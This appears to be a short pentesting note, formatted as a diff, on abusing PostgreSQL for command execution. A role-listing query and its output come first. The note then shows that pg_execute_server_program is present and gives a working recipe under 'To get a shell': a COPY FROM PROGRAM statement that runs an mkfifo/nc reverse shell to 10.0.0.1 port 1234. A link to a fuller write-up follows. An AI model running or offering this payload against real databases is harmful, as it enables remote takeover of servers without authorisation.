@@ -1,1 +1,29 @@
 SELECT r.rolname,r.rolsuper,r.rolinherit,r.rolcreaterole,r.rolcreatedb,r.rolcanlogin,r.rolconnlimit,r.rolvaliduntil,ARRAY(SELECT b.rolname FROM pg_catalog.pg_auth_members m JOIN pg_catalog.pg_roles b ON (m.roleid = b.oid) WHERE m.member = r.oid) as memberof,r.rolreplication FROM pg_catalog.pg_roles r ORDER BY 1;
+
+
+
+##### Output
+
+          rolname          | rolsuper | rolinherit | rolcreaterole | rolcreatedb | rolcanlogin | rolconnlimit | rolvaliduntil |                           memberof                           | rolreplication 
+---------------------------+----------+------------+---------------+-------------+-------------+--------------+---------------+--------------------------------------------------------------+----------------
+ pg_execute_server_program | f        | t          | f             | f           | f           |           -1 |               | {}                                                           | f
+ pg_monitor                | f        | t          | f             | f           | f           |           -1 |               | {pg_read_all_settings,pg_read_all_stats,pg_stat_scan_tables} | f
+ pg_read_all_settings      | f        | t          | f             | f           | f           |           -1 |               | {}                                                           | f
+ pg_read_all_stats         | f        | t          | f             | f           | f           |           -1 |               | {}                                                           | f
+ pg_read_server_files      | f        | t          | f             | f           | f           |           -1 |               | {}                                                           | f
+ pg_signal_backend         | f        | t          | f             | f           | f           |           -1 |               | {}                                                           | f
+ pg_stat_scan_tables       | f        | t          | f             | f           | f           |           -1 |               | {}                                                           | f
+ pg_write_server_files     | f        | t          | f             | f           | f           |           -1 |               | {}                                                           | f
+ postgres                  | t        | t          | t             | t           | t           |           -1 |               | {}                                                           | t
+
+
+
+From the first Line we have pg_execute_server_program
+
+#To get a shell:
+	CREATE TABLE shell(output text);
+	COPY shell FROM PROGRAM ‘rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1| nc 10.0.0.1 1234 >/tmp/f’;
+
+
+#Full details here:
+https://medium.com/r3d-buck3t/command-execution-with-postgresql-copy-command-a79aef9c2767
